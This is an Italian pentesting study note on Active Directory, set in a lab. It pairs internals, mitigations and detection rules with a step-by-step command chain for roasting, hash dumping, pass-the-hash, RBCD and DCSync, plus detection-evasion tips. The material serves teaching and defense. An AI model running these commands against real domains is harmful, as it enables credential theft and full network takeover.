---
tipo: concetto
tag: [windows, ad]
fase: 2
fonti: 6
aggiornato: 2026-06-21
stato: maturo
aliases: ["Active Directory"]
---

# Active Directory

## In breve
**Active Directory (AD)** è il servizio Microsoft che gestisce centralmente identità, computer, gruppi e policy in una rete aziendale. È il cuore dell'identità Windows e, di conseguenza, il **bersaglio primario** in quasi ogni pentest interno: compromettere il dominio = compromettere l'azienda. La maggior parte degli attacchi sfrutta **misconfigurazioni**, non exploit.

## Componenti
- **Domain Controller (DC)** — server che ospita AD, autentica gli utenti ([[Kerberos]]), distribuisce le GPO. Ridondato (≥2).
- **Dominio** — unità base (`azienda.local`); contiene tutti gli oggetti.
- **Tree / Forest** — domini collegati gerarchicamente; la **forest** è il confine di sicurezza reale.
- **Trust** — relazioni di fiducia tra domini/forest (vettore di attacco cross-domain).

| Oggetto | Descrizione |
|---|---|
| User / Computer | account utente / macchina nel dominio |
| Group | raccolta di principal (per assegnare permessi) |
| OU | contenitore logico per organizzare e applicare GPO |
| GPO | set di configurazioni applicate a OU/dominio |
| SPN | Service Principal Name: lega un servizio a un account ([[Kerberoasting]]) |

## Autenticazione e protocolli
- **[[Kerberos]]** (predefinito) — ticket cifrati, niente password sulla rete.
- **NTLM** — fallback legacy, più debole, abilita [[Pass-the-Hash]].
- **LDAP** (389 / 636 LDAPS) — interrogazione del database AD.
- **SMB** (445) — condivisioni, esecuzione remota, named pipe.
- **DNS** — gli SRV record (`_ldap._tcp...`) localizzano i DC.

## Catena d'attacco tipica (la "kill chain" AD)
```
1. Foothold       una macchina del dominio (phishing, servizio web)
2. Enumerazione   BloodHound mappa utenti/gruppi/ACL/sessioni → percorsi verso DA
3. Cred Access    Kerberoasting / AS-REP Roasting / dump LSASS
4. Lateral Move   Pass-the-Hash / Pass-the-Ticket verso altre macchine
5. Privesc        abuso ACL, delega, gruppi annidati → Domain Admin
6. Domain Domin.  DCSync → hash krbtgt → Golden Ticket = persistenza totale
```
**BloodHound** è centrale: raccoglie i dati (SharpHound) e trova grafi "tu → Domain Admins" che a occhio sono invisibili.

## Esempio pratico — enumerazione
```powershell
Get-ADUser -Filter * -Properties MemberOf | Select Name, MemberOf
Get-ADGroupMember -Identity "Domain Admins"
setspn -T azienda.local -Q */*        # account con SPN (target Kerberoasting)
```
Dall'esterno con [[CrackMapExec]] / [[enum4linux]]:
```bash
crackmapexec smb 10.10.10.0/24 -u utente -p 'Password1' --users --shares
enum4linux -a 10.10.10.10
```

## Mitigazione e difesa
- **Minimo privilegio**: nessun utente normale in `Domain Admins`; gruppo **Protected Users** per gli account sensibili.
- **Tiered Admin Model**: separa admin di dominio / server / workstation (blocca il lateral movement degli hash).
- **LAPS**: password local admin uniche e a rotazione (uccide il PtH di massa).
- **gMSA** e password lunghe sugli account di servizio (anti-Kerberoasting).
- Ruotare **krbtgt** (×2), disabilitare RC4, forzare AES.
- Monitorare [[Windows Event Log]]: **4768/4769** (Kerberos), **4624/4625** (logon), **4662** (DCSync).

---

# Approfondimento operativo

## Meccanismo interno — come è fatto il dominio sotto il cofano
- **NTDS.dit**: il database AD è un singolo file ESE (Extensible Storage Engine, lo stesso motore Jet di Exchange) su `C:\Windows\NTDS\ntds.dit` sul DC. Contiene **tutti** gli oggetti e — cifrati con la **PEK** (Password Encryption Key, a sua volta protetta dalla SYSTEM key/BootKey) — gli **hash NT** di ogni account. Chi legge NTDS.dit + SYSTEM hive ha il dominio intero. È questo il bottino finale di [[DCSync]].
- **Naming Context / partizioni**: il forest è diviso in partizioni LDAP replicate diversamente — `Domain NC` (`DC=corp,DC=local`), `Configuration NC` (topologia, siti, replica), `Schema NC` (definizioni di classi/attributi), `ForestDNS`/`DomainDNS`. La `Configuration NC` si replica su **tutta la forest**: per questo la forest, non il dominio, è il vero security boundary.
- **SID e RID**: ogni principal ha un SID `S-1-5-21-<dominio>-<RID>`. RID notevoli: `500` = Administrator built-in, `512` = Domain Admins, `502` = `krbtgt`, `519` = Enterprise Admins. Il **RID 500 non si blocca col lockout** ed è il motivo per cui spray mirati lo prediligono.
- **PAC**: dentro ogni ticket [[Kerberos]] viaggia il PAC con i SID dei gruppi dell'utente — è ciò che l'attacco DCSync/Golden Ticket falsifica per spacciarsi Domain Admin senza esserlo.
- **Replica e DRSUAPI**: i DC si sincronizzano via protocollo **MS-DRSR** (RPC `DRSUAPI`). La chiamata `DRSGetNCChanges` serve a un DC per chiedere a un altro "dammi le modifiche, incluse le password". [[DCSync]] **finge di essere un DC** e invoca esattamente questa chiamata: per questo non richiede codice sul DC e non genera Event ID di logon classici, solo `4662`.

```
Forest  ──┬── Schema NC        (definizioni — replica forest-wide)
          ├── Configuration NC (siti, repliche — replica forest-wide)
          └── Domain  corp.local
                ├── Domain NC   (utenti, gruppi, computer — replica nel dominio)
                │     └── NTDS.dit ─ hash NT cifrati con PEK ← bersaglio DCSync
                └── child.corp.local  (trust transitivo, SID history attaccabile)
```

## Catena d'attacco END-TO-END — da accesso anonimo a Domain Admin
Scenario lab: hai solo la rete, nessuna credenziale. Obiettivo: `Domain Admins`. Ogni step dice **cosa estrai** per il successivo.

### Step 0 — Ricognizione non autenticata
```bash
# Trova i DC via DNS SRV + identifica dominio/hostname
nxc smb 10.10.10.0/24                      # nxc = NetExec, erede di CrackMapExec
nxc smb 10.10.10.10 --generate-hosts-file hosts && cat hosts
# Enumerazione null-session / guest: a volte basta a listare utenti
enum4linux-ng -A 10.10.10.10
rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
```
> Estrai: **nome dominio FQDN**, **IP del DC**, eventuale **lista utenti** (per RID brute o spray).

Se le null session sono chiuse, prova il **RID cycling** (estrae username dai SID anche senza account):
```bash
nxc smb 10.10.10.10 -u guest -p '' --rid-brute 5000
```

### Step 1 — Da zero a primo set di username (RID brute / OSINT)
Con una lista username puoi tentare l'**AS-REP Roasting senza credenziali** (richiede solo che esistano account con pre-auth disabilitata):
```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 corp.local/ -usersfile users.txt -no-pass -format hashcat
```
> Estrai: hash **`$krb5asrep$`** craccabili offline.

### Step 2 — [[AS-REP Roasting]] → prima password
```bash
hashcat -m 18200 asrep.hash rockyou.txt
```
> Estrai: **una password di dominio valida** (foothold autenticato). Bivio: se nessun account è AS-REP-able, ripiega su password spray (`nxc smb DC -u users.txt -p 'Autunno2025!' --continue-on-success`) facendo **attenzione al lockout** (controlla la policy con `nxc smb DC -u u -p p --pass-pol`).

### Step 3 — Enumerazione autenticata + [[BloodHound]]
```bash
# Raccolta grafo da Linux con le credenziali appena ottenute
bloodhound-python -u svc_user -p 'Estate2025!' -d corp.local -ns 10.10.10.10 -c All --zip
# In parallelo: SPN per il Kerberoasting
impacket-GetUserSPNs -dc-ip 10.10.10.10 corp.local/svc_user:'Estate2025!'
```
> Estrai: **grafo dei percorsi** verso DA, **lista SPN** (account di servizio kerberoastabili), ACL abusabili.

### Step 4 — [[Kerberoasting]] → password account di servizio
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/svc_user:'Estate2025!' -outputfile spns.hash
hashcat -m 13100 spns.hash rockyou.txt
```
> Estrai: password di un **account di servizio** (spesso membro di gruppi privilegiati o con ACL ghiotte su altri oggetti).

### Step 5 — Movimento laterale: dump hash + [[Pass-the-Hash]]
Se l'account di servizio è local admin su una macchina, prendi una shell e dumpa LSASS/SAM:
```bash
# Esecuzione remota e dump dei secret locali (SAM + LSA + cached)
nxc smb 10.10.10.20 -u svc_sql -p 'Service#1' --sam --lsa
# oppure shell completa
impacket-wmiexec corp.local/svc_sql:'Service#1'@10.10.10.20
```
> Estrai: **hash NT** di altri utenti loggati su quella macchina (incluso magari un admin di dominio "di passaggio").

```bash
# Riuso dell'hash trovato senza craccarlo (Pass-the-Hash)
impacket-psexec -hashes :a9fdfa038c4b75ebc76dc855dd74f0da corp.local/Administrator@10.10.10.25
nxc smb 10.10.10.0/24 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0da --local-auth
```
> Estrai: accesso ad altre macchine; cerca sessioni di membri di `Domain Admins` (BloodHound: "Find DA sessions").

### Step 6 — Privilege escalation di dominio: abuso ACL / delegation
Se BloodHound mostra che il tuo account ha `GenericAll`/`WriteDacl`/`GenericWrite` su un utente/gruppo privilegiato, abusalo (vedi sezione delegation/ACL sotto). Esempio: hai `GenericAll` su un utente → **Targeted Kerberoasting** assegnandogli uno SPN, oppure resetti la sua password:
```bash
# Aggiungiti a un gruppo su cui hai WriteMembers / GenericAll
net rpc group addmem "Helpdesk" attacker -U corp.local/svc_user%'Service#1' -S 10.10.10.10
# Targeted Kerberoast: scrivi uno SPN fittizio sull'utente vittima, poi roast
bloodyAD -d corp.local -u svc_user -p 'Service#1' --host 10.10.10.10 set object victim servicePrincipalName -v 'fake/svc'
```
> Estrai: appartenenza a un gruppo che concede privilegi su un membro/macchina con percorso diretto a DA, **oppure** controllo su un account con DCSync rights.

### Step 7 — Domain Admin → [[DCSync]] → krbtgt → Golden Ticket
Una volta DA (o con i diritti `DS-Replication-Get-Changes`):
```bash
# Dump dell'hash di krbtgt (e di tutto il dominio) fingendosi un DC
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.10.10 -hashes :a9fdfa...
# Hash di chiunque
impacket-secretsdump corp.local/Administrator@10.10.10.10
```
> Estrai: **hash NT di `krbtgt`** → forgia un **Golden Ticket** (persistenza totale, vedi [[Kerberos]]) e l'hash di ogni utente del dominio. Game over.

> [!tip] La regola d'oro dell'attaccante AD
> Quasi ogni step sopra sfrutta **misconfigurazione**, non un CVE: pre-auth disattivata, SPN su account umani con password deboli, local admin riusato senza LAPS, ACL troppo larghe. La patch da sola non chiude la kill chain.

## ACL e delegation abuse — il livello che separa lo scriptato dall'esperto
**ACL abuse** = nel database AD ogni oggetto ha una DACL. Certi diritti su un oggetto bersaglio permettono di prenderne il controllo:

| Diritto (edge BloodHound) | Cosa ti permette |
|---|---|
| `GenericAll` | controllo totale: reset password, aggiunta SPN, aggiunta a gruppo |
| `GenericWrite` / `WriteProperty` | scrivere attributi → Targeted Kerberoast, RBCD |
| `WriteDacl` | riscrivere la DACL → concederti `GenericAll` |
| `WriteOwner` | diventare owner → poi WriteDacl su te stesso |
| `ForceChangePassword` | resettare la password della vittima senza saperla |
| `AddMember` | aggiungere principal a un gruppo (anche Domain Admins) |
| `DS-Replication-Get-Changes(-All)` | eseguire [[DCSync]] |

**Kerberos delegation** = permettere a un servizio di agire **per conto** di un utente verso un altro servizio. Tre varianti, tre abusi:

- **Unconstrained delegation** (`TrustedForDelegation`): il servizio riceve e **conserva in memoria il TGT** di chiunque vi si autentichi. Se controlli una macchina con unconstrained delegation, costringi un DC ad autenticarsi (es. via [[PrinterBug]]/`PetitPotam`) e ne **catturi il TGT** → impersoni il DC. Edge BloodHound: `AllowedToDelegate`/flag sull'oggetto computer.
- **Constrained delegation** (`msDS-AllowedToDelegateTo`): il servizio può impersonare utenti **solo verso SPN specifici**. Abuso: con `S4U2Self`+`S4U2Proxy` ti fai un ticket per "Administrator" verso quel servizio. Peggiora se l'SPN bersaglio è modificabile (puoi puntare a CIFS del DC).
- **RBCD — Resource-Based Constrained Delegation** (`msDS-AllowedToActOnBehalfOfOtherIdentity`): la delega è configurata **sull'oggetto risorsa**, non sull'account che delega. Se hai `GenericWrite` su un computer, scrivi su quell'attributo il SID di un account macchina che controlli → poi S4U2Self/S4U2Proxy per impersonare qualsiasi utente **su quella macchina**.

```bash
# RBCD end-to-end con Impacket: crea un computer (MachineAccountQuota>0), configura RBCD, impersona
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' corp.local/svc_user:'Service#1'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.local/svc_user:'Service#1'
impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator -dc-ip 10.10.10.10 corp.local/'EVIL$':'Evil123!'
export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```
> [!warning] MachineAccountQuota
> Di default `ms-DS-MachineAccountQuota = 10`: **ogni utente** può creare 10 account computer. È il prerequisito silenzioso di mezzo libro di attacchi RBCD/noPac. Portarlo a `0` chiude un'intera classe di abusi.

## Casi limite e varianti
- **Pre-Windows Server 2016 vs 2016+**: da Server 2016 esiste **Protected Users** e il **PAM/red forest**; LAPS è integrato in Windows 11/Server 2019+ come **Windows LAPS** (prima era un MSI separato).
- **RC4 ancora attivo**: molti domini "moderni" mantengono RC4 per retrocompatibilità → Kerberoasting resta facile. Su domini AES-only gli hash sono `-m 19700/13100` ma più lenti da craccare.
- **Functional level**: alcune feature (es. claims, ADFS) dipendono dal **forest/domain functional level**. Trust SID filtering cambia col functional level e abilita/blocca SID History injection cross-domain.
- **Read-Only DC (RODC)**: in filiali; non conserva tutti gli hash (msDS-RevealedUsers). Compromettere un RODC ≠ compromettere il dominio, ma può rivelare gli hash degli account il cui caching è permesso.
- **Azure AD / Entra ID Connect**: l'account `MSOL_*` o `Sync_*` di Entra Connect ha spesso diritti **DCSync** → bersaglio prioritario nei domini ibridi.

## Detection engineering
| Evento / fonte | Cosa indica | MITRE |
|---|---|---|
| **4768** (TGT) etype `0x17` da utente | richiesta TGT in RC4 → fase iniziale roasting | T1558 |
| **4769** (TGS) molti, etype `0x17`, un solo account | [[Kerberoasting]] in corso | T1558.003 |
| **4768** senza pre-auth (`Pre-Authentication Type 0`) | [[AS-REP Roasting]] | T1558.004 |
| **4662** con `Properties` GUID `1131f6aa…`/`1131f6ad…` | replica DS-Get-Changes → [[DCSync]] da host non-DC | T1003.006 |
| **4624 Type 3** NTLM da admin su molte macchine | spray [[Pass-the-Hash]] | T1550.002 |
| **4741/4742** creazione/modifica computer account + RBCD | abuso RBCD / MachineAccountQuota | T1098 |
| **5136** modifica DACL su oggetto privilegiato | ACL abuse (WriteDacl) | T1222 |

Regola Sigma (DCSync da host non-DC):
```yaml
title: Possibile DCSync da host non-DC
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'   # DS-Replication-Get-Changes
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'   # DS-Replication-Get-Changes-All
  filter_dc:
    SubjectUserName|endswith: '$'   # gli account macchina DC sono legittimi
  condition: selection and not filter_dc
level: high
```

## Evasion / OPSEC (con limiti)
- **Roasting mirato**: chiedi i TGS uno alla volta invece che `-request` di massa → meno `4769` correlati. Limite: con buon UEBA basta un singolo `4769` RC4 verso un account "umano" per allertare.
- **LDAP throttling**: SharpHound/BloodHound generano picchi LDAP; `--stealth` riduce il rumore ma rallenta. Limite: la query verso `Configuration NC` resta caratteristica.
- **Forza AES** dove possibile per non lasciare il pattern RC4: ma molti tool non lo supportano e perdi velocità di cracking.
- Evita `psexec` (crea servizio → **7045** + binario su disco); preferisci `wmiexec`/`smbexec`. Limite: `wmiexec` lascia comunque `4688` con `wmiprvse.exe` come parent.

## Troubleshooting — 5 errori da principiante
1. **`KRB_AP_ERR_SKEW (clock skew too great)`** → l'orologio dell'attaccante diverge >5 min dal DC. Kerberos rifiuta. Causa: VM con clock sfuori sync → `ntpdate <DC>` o `sudo timedatectl set-ntp on`.
2. **`GetUserSPNs` ritorna 0 risultati pur con credenziali valide** → il dominio ha pochi/zero SPN su account umani, oppure hai messo male il realm. Causa reale: spesso serve usare il **dc-ip** giusto e il dominio in MAIUSCOLO nel ccache.
3. **Pass-the-Hash fallisce con `STATUS_ACCESS_DENIED` su account di dominio** → PtH funziona via NTLM; se l'host ha **NTLM disabilitato** o l'account è in **Protected Users**, fallisce. Soluzione: usa Overpass-the-Hash (hash → TGT) via `getTGT`.
4. **`secretsdump` DCSync dà `RPC_S_ACCESS_DENIED`** → l'account non ha i diritti di replica. Causa: non sei DA né hai `DS-Replication-Get-Changes`. Verifica con BloodHound prima di tentare.
5. **BloodHound vuoto / "no results"** → spesso DNS non risolve il dominio dal box Linux. Causa: manca `-ns <DC-IP>` o `/etc/resolv.conf` non punta al DC; AD dipende totalmente dal suo DNS.

## Domande da colloquio
**D: Perché la forest, e non il dominio, è il vero confine di sicurezza?**
R: Perché la `Configuration NC` (e lo schema) si replica su tutta la forest e i trust tra domini della stessa forest sono transitivi e poco filtrati; chi diventa Enterprise Admin o compromette un DC controlla l'intera forest. Un trust tra forest, invece, può applicare SID filtering. Quindi isolare due ambienti richiede forest separate, non solo domini.

**D: Spiega DCSync senza dire "dumpa gli hash".**
R: DCSync abusa del protocollo di replica AD (MS-DRSR / `DRSGetNCChanges`). Un principal con i diritti `DS-Replication-Get-Changes` può chiedere a un DC le modifiche al naming context, incluse le credenziali, **fingendosi un altro DC**. Non serve eseguire codice sul DC, per questo lascia tracce solo come Event 4662 di replica da un host che non è un DC.

**D: Hai `GenericWrite` su un account computer. Come arrivi a impersonare Administrator su quella macchina?**
R: Configuro RBCD: scrivo nell'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del computer bersaglio il SID di un account macchina che controllo (creandolo se MachineAccountQuota>0), poi uso S4U2Self+S4U2Proxy (`getST -impersonate Administrator`) per ottenere un service ticket come Administrator verso CIFS/HOST e fare psexec.

**D: Perché RC4 è la "spia" dei roasting?**
R: Perché con etype 23 (RC4) il materiale craccabile è direttamente l'NT hash dell'account, molto più veloce da brute-forzare di AES. Gli attaccanti spesso **declassano** la richiesta a RC4, quindi un boom di Event 4769/4768 con etype 0x17 verso account di servizio è la firma del Kerberoasting/AS-REP Roasting.

## Collegamenti
- [[Kerberos]]
- [[Pass-the-Hash]]
- [[Kerberoasting]]
- [[AS-REP Roasting]]
- [[BloodHound]]
- [[DCSync]]
- [[Mimikatz]]
- [[Windows Event Log]]
- [[CrackMapExec]]
- [[NetExec]]
- [[Impacket]]
- [[bloodyAD]]
- [[enum4linux]]
- [[SMB]]
- [[NTLM]]
- [[LAPS]]
- [[PrinterBug]]
- [[Lateral Movement]]

## Fonti
- Microsoft Learn — AD DS overview: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview
- TryHackMe — Active Directory Basics: https://tryhackme.com/room/winadbasics
- HackTricks — AD methodology: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- The Hacker Recipes — Active Directory: https://www.thehacker.recipes/ad/
- The Hacker Recipes — Kerberos delegations: https://www.thehacker.recipes/ad/movement/kerberos/delegations
- MITRE ATT&CK — DCSync (T1003.006): https://attack.mitre.org/techniques/T1003/006/
